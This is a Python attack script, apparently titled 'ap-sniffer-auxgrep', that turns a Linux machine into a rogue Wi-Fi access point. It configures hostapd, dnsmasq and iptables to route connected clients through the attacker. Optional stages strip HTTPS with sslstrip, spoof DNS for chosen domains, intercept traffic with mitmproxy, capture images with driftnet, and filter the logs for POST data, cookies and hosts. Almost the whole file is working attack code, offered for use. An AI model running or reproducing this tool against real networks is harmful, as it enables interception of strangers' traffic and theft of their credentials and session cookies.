#!/usr/bin/env python3
# Author : Auxgrep
# Email  : mranonymoustz@tutanota.com
# @2023


import os
import time
import subprocess
import sys
import platform


sudo = "/usr/bin/sudo"
tee = "/usr/bin/tee"


def _run_cmd_write(cmd_args, s):
        # write a file using sudo
        p = subprocess.Popen(cmd_args,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.DEVNULL,
                            shell=False, universal_newlines=True)
        p.stdin.write(s)
        p.stdin.close()
        p.wait()

def write_file(path, s):
         _run_cmd_write((sudo, tee, path), s)

def append_file(path, s):
    
        _run_cmd_write((sudo, tee, "-a", path), s)


class module1():

    colorcode = {

        'ITALIC':'\033[3m', 'YELLOW':'\033[1;33m',
        'GREEN':'\033[0;32m', 'BLINK':'\033[5m',
        'RESET':'\033[0m', 'RED':'\033[0;31m',
        'BROWN':'\033[0;33m', 'PURPLE':'\033[0;35m'

    }

    if not os.geteuid() == 0:
        exit('\n{0}{1}{2}PLease run the script with root privs{3}\n'.format(colorcode["ITALIC"], \
            colorcode["RED"], colorcode['BLINK'], colorcode["RESET"]))

    #disclaimer();
    os.system('clear')

    # detect os
    operating_sys = platform.system()

    if operating_sys != "Linux":
        print('Script work with {0}Linux{1} OS only'.format(colorcode["RED"], \
            colorcode["RESET"]))
        sys.exit()
    else:
        print('{0}Linux{1} os detected'.format(colorcode["RED"], colorcode["RESET"]))

    sudo = "/usr/bin/sudo"
    tee = "/usr/bin/tee"


    def _run_cmd_write(cmd_args, s):
        # write a file using sudo
        p = subprocess.Popen(cmd_args,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.DEVNULL,
                            shell=False, universal_newlines=True)
        p.stdin.write(s)
        p.stdin.close()
        p.wait()

    def write_file(path, s):
         _run_cmd_write((sudo, tee, path), s)

    def append_file(path, s):
    
        _run_cmd_write((sudo, tee, "-a", path), s)

    try:
        script_path = os.path.dirname(os.path.realpath(__file__))
        script_path = script_path + "/"
        os.system("sudo mkdir " + script_path + "logs > /dev/null 2>&1")
        os.system("sudo chmod 777 " + script_path + "logs")

        #UPDATING
        update = input("[?] Install/Update dependencies? Y/n: ")
        update = update.lower()
        if update == "y" or update == "":
            print("[I] Checking/Installing dependencies, please wait...")
            os.system("sudo apt-get update")
            os.system("sudo apt-get install dnsmasq -y")
            os.system("sudo apt-get install wireshark -y")
            os.system("sudo apt-get install hostapd -y")
            os.system("sudo apt-get install screen -y")
            os.system("sudo apt-get install wondershaper -y")
            os.system("sudo apt-get install driftnet -y")
            os.system("sudo apt-get install python-pip -y")
            os.system("sudo apt-get install python3-pip -y")
            os.system("sudo apt-get install python3-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg62-turbo-dev zlib1g-dev -y")
            os.system("sudo apt-get install libpcap-dev -y")
            os.system("sudo python3 -m pip install mitmproxy")
            os.system("sudo python -m pip install dnspython")
            os.system("sudo python -m pip install pcapy")
            os.system("sudo python -m pip install twisted")
            os.system("sudo pip3 install platform")
        #/UPDATING

        os.system('clear')
        time.sleep(2)
        print("{0}{1}Now Let's start by Configuring our Shit!!{2}".format(colorcode["PURPLE"], \
            colorcode["ITALIC"], colorcode["RESET"]))
        print('')
        ap_iface = input("{0}[?] Please enter the name of your wireless external adapter interface:{1} ".format(colorcode["BROWN"], \
            colorcode["RESET"]))
        net_iface = input("{0}[?] Please enter the name of your internet connected interface:{1} ".format(colorcode["BROWN"], \
            colorcode["RESET"]))
        network_manager_cfg = "[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:" + ap_iface + "\n"
        print("{0}[I] Backing up NetworkManager.cfg...{1}{2}yes is there error!! Ignore it{1}".format(colorcode["GREEN"], colorcode["RESET"], \
            colorcode["RED"]))
        os.system("sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup")
        print("[I] {0}Editing NetworkManager.cfg...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
        write_file("/etc/NetworkManager/NetworkManager.conf", network_manager_cfg )
        print("[I]{0} Restarting NetworkManager...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
        os.system("sudo service NetworkManager restart")
        os.system("sudo ifconfig " + ap_iface + " up")

        #SSLSTRIP QUESTION
        print('{0}{1}NOTE: sslstrip contain alot of bugs, be aware!!{2}'.format(colorcode["RED"], colorcode["BLINK"], \
            colorcode["RESET"]))
        sslstrip_if = input("{2}[?] Use SSLSTRIP to bypass {3}{0}HTTPS?{3}{2} Y/n:{3} ".format(colorcode["RED"], \
            colorcode["BLINK"], colorcode["BROWN"], colorcode["RESET"]))
        sslstrip_if = sslstrip_if.lower()
        #/SSLSTRIP QUESTION

        #DRIFTNET QUESTION
        driftnet_if = input("{0}[?] Capture unencrypted images with DRIFTNET? Y/n{1}: ".format(colorcode["BROWN"], \
            colorcode["RESET"]))
        driftnet_if = driftnet_if.lower()
        #/DRIFTNET QUESTION

        #DNSMASQ CONFIG
        print("[I] Backing up /etc/dnsmasq.conf...")
        os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
        print("{0}[I] Creating new /etc/dnsmasq.conf...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
        if sslstrip_if == "y" or sslstrip_if == "":
            dnsmasq_file = "port=0\n# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface=" + ap_iface + "\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
        else:
            dnsmasq_file = "# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface=" + ap_iface + "\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n# dns addresses to send to the clients\nserver=8.8.8.8\nserver=10.0.0.1\n"
        print("{0}[I] Deleting old config file...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
        os.system("sudo rm /etc/dnsmasq.conf > /dev/null 2>&1")
        print("{0}[I] Writing config file...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
        write_file("/etc/dnsmasq.conf", dnsmasq_file)
        #/DNSMASQ CONFIG

        #HOSTAPD CONFIG
        ssid = input("{0}[?] Please enter the SSID for the AP:{1} ".format(colorcode["BROWN"], \
            colorcode["RESET"]))
        while True:
            channel = input("{0}[?] Please enter the channel for the AP:{1} ".format(colorcode["BROWN"], \
            colorcode["RESET"]))
            if channel.isdigit():
                break
            else:
                print("{2}[!] Please enter a channel number.{1}".format(colorcode["BROWN"], \
            colorcode["RESET"], colorcode["GREEN"]))
        hostapd_wpa = input("{0}[?] Enable {1}{2}WPA2 encryption?{1}{0} y/N:{1} ".format(colorcode["BROWN"], \
            colorcode["RESET"], colorcode["RED"]))
        hostapd_wpa = hostapd_wpa.lower()
        if hostapd_wpa == "y":
            canBreak = False
            while not canBreak:
                wpa_passphrase = input("{0}[?] Please enter the WPA2 passphrase for the AP:{1} ".format(colorcode["BROWN"], \
            colorcode["RESET"]))
                if len(wpa_passphrase) < 8:
                    print("{0}[!] Please enter minimum 8 characters for the WPA2 passphrase.{1}".format(colorcode["RED"], \
            colorcode["RESET"]))
                else:
                    canBreak = True
            hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + wpa_passphrase + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP\n"
        else:
            hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
        print("{0}[I] Deleting old config file...{1}".format(colorcode["GREEN"], \
            colorcode["RESET"]))
        os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
        print("{0}[I] Writing config file...{1}".format(colorcode["BROWN"], \
            colorcode["RESET"]))
        write_file("/etc/hostapd/hostapd.conf", hostapd_file)
        #/HOSTAPD CONFIG

        #IPTABLES
        print("{0}{2}[I] Configuring AP interface...{1}".format(colorcode["YELLOW"], \
            colorcode["RESET"], colorcode["ITALIC"]))
        os.system("sudo ifconfig " + ap_iface + " up 10.0.0.1 netmask 255.255.255.0")
        print("{0}[I] Applying iptables rules...{1}".format(colorcode["GREEN"], \
            colorcode["RESET"]))
        os.system("sudo iptables --flush")
        os.system("sudo iptables --table nat --flush")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        os.system("sudo iptables --table nat --append POSTROUTING --out-interface " + net_iface + " -j MASQUERADE")
        os.system("sudo iptables --append FORWARD --in-interface " + ap_iface + " -j ACCEPT")
        #/IPTABLES

        #SPEED LIMIT
        speed_if = input("{0}[?] Set speed limit for the clients? Y/n: {1}".format(colorcode["BROWN"], \
            colorcode["RESET"]))
        speed_if = speed_if.lower()
        if speed_if == "y" or speed_if == "":
            while True:
                speed_down = input("{0}[?] Download speed limit (in KB/s): {1}".format(colorcode["BROWN"], \
                    colorcode["RESET"]))
                if speed_down.isdigit():
                    break
                else:
                    print("{0}[!] Please enter a number.{1}".format(colorcode["GREEN"], colorcode["RESET"]))
            while True:
                speed_up = input("{0}[?] Upload speed limit (in KB/s): {1}".format(colorcode["BROWN"], colorcode["RESET"]))
                if speed_up.isdigit():
                    break
                else:
                    print("{0}[!] Please enter a number.{1}".format(colorcode["GREEN"], colorcode["RESET"]))
            print("{0}[I] Setting speed limit on {1}" + ap_iface + "...".format(colorcode["GREEN"], \
                colorcode["RESET"]))
            os.system("sudo wondershaper " + ap_iface + " " + speed_up + " " + speed_down)
        else:
            print("[I] Skipping...")
        #/SPEED LIMIT

        #WIRESHARK & TSHARK QUESTION
        wireshark_if = input("[?] Start WIRESHARK on " + ap_iface + "? Y/n: ")
        wireshark_if = wireshark_if.lower()
        tshark_if = "n"
        if wireshark_if != "y" and wireshark_if != "":
            tshark_if = input("{0}[?] Capture packets to .pcap with TSHARK? (no gui needed) Y/n: {1}".format(colorcode["BROWN"], \
                colorcode["RESET"]))
            tshark_if = tshark_if.lower()
        #/WIRESHARK & TSHARK QUESTION
        #SSLSTRIP MODE
        if sslstrip_if == "y" or sslstrip_if == "":

            #SSLSTRIP DNS SPOOFING
            ssl_dns_if = input("{0}[?] Spoof DNS manually? y/N: {1}".format(colorcode["BROWN"], colorcode["RESET"]))
            ssl_dns_if = ssl_dns_if.lower()
            if ssl_dns_if == "y":
                while True:
                    ssl_dns_num = input("{0}[?] How many domains do you want to spoof?: {1}".format(colorcode["BROWN"], \
                        colorcode["RESET"]))
                    if ssl_dns_num.isdigit():
                        break
                    else:
                        print("{0}[!] Please enter a number.{1}".format(colorcode["RED"], colorcode["RESET"]))
                print("[I] Backing up " + script_path + "src/dns2proxy/spoof.cfg...")
                os.system("sudo cp " + script_path + "src/dns2proxy/spoof.cfg  " + script_path + "src/dns2proxy/spoof.cfg.backup")
                os.system("sudo cat /dev/null > "+ script_path + "src/dns2proxy/spoof.cfg")
                i = 0
                while int(ssl_dns_num) != i:
                    ssl_dns_num_temp = i + 1
                    ssl_dns_domain = input("[?] " + str(ssl_dns_num_temp) + ". domain to spoof: ")
                    ssl_dns_ip = input("[?] Fake IP for domain '" + ssl_dns_domain + "': ")
                    ssl_dns_line = ssl_dns_domain + " " + ssl_dns_ip + "\n"
                    os.system("sudo echo -e '" + ssl_dns_line + "' >> "+ script_path + "src/dns2proxy/spoof.cfg")
                    i = i + 1
                    #/SSLSTRIP DNS SPOOFING

            print("{0}{1} Starting DNSMASQ server...{2}".format(colorcode["GREEN"], colorcode["BLINK"], \
                colorcode["RESET"]))
            os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
            os.system("sudo pkill dnsmasq")
            os.system("sudo dnsmasq")

            proxy_if = "n"
            os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000")
            os.system("sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
            os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53")
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")



            print("[I] Starting AP on " + ap_iface + " in screen terminal...")
            os.system("sudo screen -S ap-sniffer-auxgrep-sslstrip -m -d python " + script_path + "src/sslstrip2/sslstrip.py -l 9000 -w " + script_path + "logs/ap-sniffer-auxgrep-sslstrip.log -a")
            os.system("sudo screen -S ap-sniffer-auxgrep-dns2proxy -m -d sh -c 'cd " + script_path + "src/dns2proxy && python dns2proxy.py'")
            time.sleep(5)
            os.system("sudo screen -S ap-sniffer-auxgrep-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
            if wireshark_if == "y" or wireshark_if == "":
                print("{0}Are you a dumbest {1}{2}hacker??{1} {0}you can start wireshark manual lol!!{1}".format(colorcode["GREEN"], \
                    colorcode["RESET"], colorcode["RED"]))
                print('')
                print("{0}[I] Starting WIRESHARK...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
                os.system("sudo screen -S ap-sniffer-auxgrep-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/ap-sniffer-auxgrep-wireshark.pcap")
            if driftnet_if == "y" or driftnet_if == "":
                print('')
                print("{0}[I] Starting DRIFTNET...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
                os.system("sudo screen -S ap-sniffer-auxgrep-driftnet -m -d driftnet -i " + ap_iface)
            if tshark_if == "y" or tshark_if == "":
                print("{0}[I] Starting TSHARK...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
                os.system("sudo screen -S ap-sniffer-auxgrep-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/ap-sniffer-auxgrep-tshark.pcap")
            print("\nTAIL started on " + script_path + "logs/ap-sniffer-auxgrep-sslstrip.log...\nWait for output... (press 'CTRL + C' 2 times to stop)\nHOST-s, POST requests and COOKIES will be shown.\n")
            try:
                time.sleep(5)
            except:
                print("")
            while True:
                try:
                    print("{0}[I] Restarting tail in 1 sec... (press 'CTRL + C' again to stop){1}".format(colorcode["GREEN"], \
                        colorcode["RESET"]))
                    time.sleep(1)
                    os.system("sudo tail -f " + script_path + "logs/ap-sniffer-auxgrep-sslstrip.log | grep -e 'Sending Request: POST' -e 'New host:' -e 'Sending header: cookie' -e 'POST Data'")
                except KeyboardInterrupt:
                    break
            #STARTING POINT
        #SSLSTRIP MODE


        else:
            #DNSMASQ DNS SPOOFING
            dns_if = input("{0}[?] Spoof DNS? Y/n: {1}".format(colorcode["BROWN"], colorcode["RESET"]))
            dns_if = dns_if.lower()
            if dns_if == "y" or dns_if == "":
                while True:
                    dns_num = input("{0}[?] How many domains do you want to spoof?: {1}".format(colorcode["BROWN"], colorcode["RESET"]))
                    if dns_num.isdigit():
                        break
                    else:
                        print("{0}[!] Please enter a number.{1}".format(colorcode["GREEN"], colorcode["RESET"]))
                print("{0}[I] Backing up /etc/dnsmasq.conf...{1}".format(colorcode["GREEN"], colorcode["RESET"]))
                os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
                i = 0
                while int(dns_num) != i:
                    dns_num_temp = i + 1
                    dns_domain = input("[?] " + str(dns_num_temp) + ". domain to spoof: ")
                    dns_ip = input("[?] Fake IP for domain '" + dns_domain + "': ")
                    dns_line = "address=/" + dns_domain + "/" + dns_ip + "\n"
                    append_file("/etc/dnsmasq.conf", dns_line)
                    i = i + 1
            else:
                print("[I] Skipping..")
            #/DNSMASQ DNS SPOOFING

            print("{0}{1}[I] Starting DNSMASQ server...{2}".format(colorcode["RED"], colorcode["BLINK"], colorcode["RESET"]))
            os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
            os.system("sudo pkill dnsmasq")
            os.system("sudo dnsmasq")

            #MITMPROXY MODE
            print('{0}Hey !! capture traffic is not neccessary! we have {2}{3}wireshark{2} {0}you can use it manual{2}'.format(colorcode["GREEN"], \
                colorcode["BLINK"], colorcode["RESET"], colorcode["RED"]))
            proxy_if = input("[?] Capture traffic? Y/n: ")
            proxy_if = proxy_if.lower()
            if proxy_if == "y" or proxy_if == "":
                proxy_config = input("{0}[?] Capture HTTPS traffic too? (Need to install certificate on device) y/N: {1}".format(colorcode["GREEN"], \
                    colorcode["RESET"]))
                proxy_config = proxy_config.lower()
                if proxy_config == "n" or proxy_config == "":
                    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
                else:
                    print("[I] To install the certificate, go to 'http://mitm.it/' through the proxy, and choose your OS.")
                    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
                    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
                os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
                print("[I] Starting AP on " + ap_iface + " in screen terminal...")
                if wireshark_if == "y" or wireshark_if == "":
                    print("[I] Starting WIRESHARK...")
                    os.system("sudo screen -S ap-sniffer-auxgrep-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/ap-sniffer-auxgrep-wireshark.pcap")
                if driftnet_if == "y" or driftnet_if == "":
                    print("[I] Starting DRIFTNET...")
                    os.system("sudo screen -S ap-sniffer-auxgrep-driftnet -m -d driftnet -i " + ap_iface)
                if tshark_if == "y" or tshark_if == "":
                    print("[I] Starting TSHARK...")
                    os.system("sudo screen -S ap-sniffer-auxgrep-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/ap-sniffer-auxgrep-tshark.pcap")
                os.system("sudo screen -S ap-sniffer-auxgrep-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
                print("\nStarting MITMPROXY in 5 seconds... (press q and y to exit)\n")
                try:
                    time.sleep(5)
                except:
                    print("")
                os.system("sudo mitmproxy --mode transparent --set console_focus_follow=value -w " + script_path + "logs/ap-sniffer-auxgrep-proxy.mitmproxy")
                #STARTING POINT
            else:
                print("[I] Skipping...")
            #/MITMPROXY MODE

                if wireshark_if == "y" or wireshark_if == "":
                    print("[I] Starting WIRESHARK...")
                    os.system("sudo screen -S ap-sniffer-auxgrep-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/ap-sniffer-auxgrep-wireshark.pcap")
                if driftnet_if == "y" or driftnet_if == "":
                    print("[I] Starting DRIFTNET...")
                    os.system("sudo screen -S ap-sniffer-auxgrep-driftnet -m -d driftnet -i " + ap_iface)
                if tshark_if == "y" or tshark_if == "":
                    print("[I] Starting TSHARK...")
                    os.system("sudo screen -S ap-sniffer-auxgrep-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/ap-sniffer-auxgrep-tshark.pcap")
                os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
                print("[I] Starting AP on " + ap_iface + "...\n")
                os.system("sudo hostapd /etc/hostapd/hostapd.conf")
                #STARTING POINT

        #STOPPING
        print("")
        print("[!] Stopping...")
        if proxy_if == "y" or proxy_if == "" or sslstrip_if == "y" or sslstrip_if == "":
            os.system("sudo screen -S ap-sniffer-auxgrep-hostapd -X stuff '^C\n'")
            if sslstrip_if == "y" or sslstrip_if == "":
                os.system("sudo screen -S ap-sniffer-auxgrep-sslstrip -X stuff '^C\n'")
                os.system("sudo screen -S ap-sniffer-auxgrep-dns2proxy -X stuff '^C\n'")
                if ssl_dns_if == "y":
                    print("[I] Restoring old " + script_path + "src/dns2proxy/spoof.cfg...")
                    os.system("sudo mv " + script_path + "src/dns2proxy/spoof.cfg.backup  " + script_path + "src/dns2proxy/spoof.cfg")
        if wireshark_if == "y" or wireshark_if == "":
            os.system("sudo screen -S ap-sniffer-auxgrep-wireshark -X stuff '^C\n'")
        if driftnet_if == "y" or driftnet_if == "":
            os.system("sudo screen -S ap-sniffer-auxgrep-driftnet -X stuff '^C\n'")
        if tshark_if == "y" or tshark_if == "":
            os.system("sudo screen -S ap-sniffer-auxgrep-tshark -X stuff '^C\n'")
        print("[I] Restoring old NetworkManager.cfg")
        if os.path.isfile("/etc/NetworkManager/NetworkManager.conf.backup"):
            os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf")
        else:
            os.system("sudo rm /etc/NetworkManager/NetworkManager.conf")
        print("[I] Restarting NetworkManager...")
        os.system("sudo service NetworkManager restart")
        print("[I] Stopping DNSMASQ server...")
        os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
        os.system("sudo pkill dnsmasq")
        print("[I] Restoring old dnsmasq.cfg...")
        os.system("sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1")
        print("[I] Deleting old '/etc/dnsmasq.hosts' file...")
        os.system("sudo rm /etc/dnsmasq.hosts > /dev/null 2>&1")
        print("[I] Removeing speed limit from " + ap_iface + "...")
        os.system("sudo wondershaper clear " + ap_iface + " > /dev/null 2>&1")
        print("[I] Flushing iptables rules...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --flush -t nat")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        print("[I] Traffic have been saved to the 'log' folder!")
        print("[I] ap-sniffer-auxgrep stopped.")
    except KeyboardInterrupt:
        print("\n\n[!] Stopping... ({0}{2}hahahhahah!!! Dont worry if you get errors{1})".format(colorcode["RED"], \
            colorcode["RESET"], colorcode["ITALIC"]))
        try:
            if proxy_if == "y" or proxy_if == "" or sslstrip_if == "y" or sslstrip_if == "":
                os.system("sudo screen -S ap-sniffer-auxgrep-hostapd -X stuff '^C\n'")
                if sslstrip_if == "y" or sslstrip_if == "":
                    os.system("sudo screen -S ap-sniffer-auxgrep-sslstrip -X stuff '^C\n'")
                    os.system("sudo screen -S ap-sniffer-auxgrep-dns2proxy -X stuff '^C\n'")
                    if ssl_dns_if == "y":
                        print("[I] Restoring old " + script_path + "src/dns2proxy/spoof.cfg...")
                        os.system("sudo mv " + script_path + "src/dns2proxy/spoof.cfg.backup  " + script_path + "src/dns2proxy/spoof.cfg")
        except:
            pass
        try:
            if wireshark_if == "y" or wireshark_if == "":
                os.system("sudo screen -S ap-sniffer-auxgrep-wireshark -X stuff '^C\n'")
        except:
            pass
        try:
            if driftnet_if == "y" or driftnet_if == "":
                os.system("sudo screen -S ap-sniffer-auxgrep-driftnet -X stuff '^C\n'")
        except:
            pass
        try:
            if tshark_if == "y" or tshark_if == "":
                os.system("sudo screen -S ap-sniffer-auxgrep-tshark -X stuff '^C\n'")
        except:
            pass
        print("[I] Restoring old NetworkManager.cfg")
        if os.path.isfile("/etc/NetworkManager/NetworkManager.conf.backup"):
            os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1")
        else:
            os.system("sudo rm /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1")
        print("[I] Restarting NetworkManager...")
        os.system("sudo service NetworkManager restart")
        print("[I] Stopping DNSMASQ server...")
        os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
        os.system("sudo pkill dnsmasq")
        print("[I] Restoring old dnsmasq.cfg...")
        os.system("sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1")
        print("[I] Deleting old '/etc/dnsmasq.hosts' file...")
        os.system("sudo rm /etc/dnsmasq.hosts > /dev/null 2>&1")
        try:
            print("[I] Removeing speed limit from " + ap_iface + "...")
            os.system("sudo wondershaper clear " + ap_iface + " > /dev/null 2>&1")
        except:
            pass
        print("[I] Flushing iptables rules...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --flush -t nat")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        print("[I] ap-sniffer-auxgrep stopped.")
        print('{0}{2}Byeeeeeeeeeeee!!!{1}'.format(colorcode["YELLOW"], \
            colorcode["RESET"], colorcode["ITALIC"]))

        